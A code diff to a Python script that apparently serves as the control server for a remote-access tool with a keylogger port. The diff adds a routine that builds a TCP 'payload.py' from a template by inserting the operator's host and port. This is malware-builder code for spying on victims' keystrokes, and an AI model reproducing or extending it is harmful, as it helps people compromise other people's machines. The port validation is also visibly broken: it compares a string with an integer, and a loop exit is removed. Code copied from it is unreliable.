@@ -117,7 +117,9 @@ class Server:
 
 def main()->None:
     __TEMPLATE_PATH = "templates/spython_tcp_template.py"
-    
+    __PAYLOAD_FILE_NAME =  "payload.py"
+    __SIG_HOST = "SPYTHON_HOST"
+    __SIG_PORT = "SPYTHON_PORT"
     #Takes input from user and validates it
     while True:
         HOST = input("Host : ") or "127.0.0.1"
@@ -128,18 +130,35 @@ def main()->None:
              continue
         try:
             MAIN_PORT = input("Main port:") or 5000
-            if MAIN_PORT >1000 and MAIN_PORT < 2**16:
+            if int(MAIN_PORT >1000) and int(MAIN_PORT) < 2**16:
                KLOG_PORT = MAIN_PORT+1
                BIN_PORT = MAIN_PORT+2  
-               break
+      
         except ValueError :
             sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
         flag = input("Automatically generate paylaod?[y/n](default=y): ") or "y"
-        #continue auto generation feature
+       
         if flag.lower() == "y":
-             break
+           TEMP = ""
+           with open(__TEMPLATE_PATH,"r") as f:
+                data = f.readlines()
+                data = [i.replace(__SIG_HOST,f"\"{HOST}\"") for i in data]
+                with open(__PAYLOAD_FILE_NAME,"w") as f2:
+                     for line in data:
+                         f2.write(line)
+                with open(__PAYLOAD_FILE_NAME, "r") as f2:
+                     new_data = f2.readlines()
+                     new_data = [ i.replace(__SIG_PORT,str(MAIN_PORT)) for i in new_data]
+                     TEMP = new_data
+                with open(__PAYLOAD_FILE_NAME,"w") as f2:
+                     for i in TEMP:
+                         f2.write(i)
+                     TEMP=""
+           break
+        
         elif flag.lower() == "n":
              break
+        
         else:
              continue
            
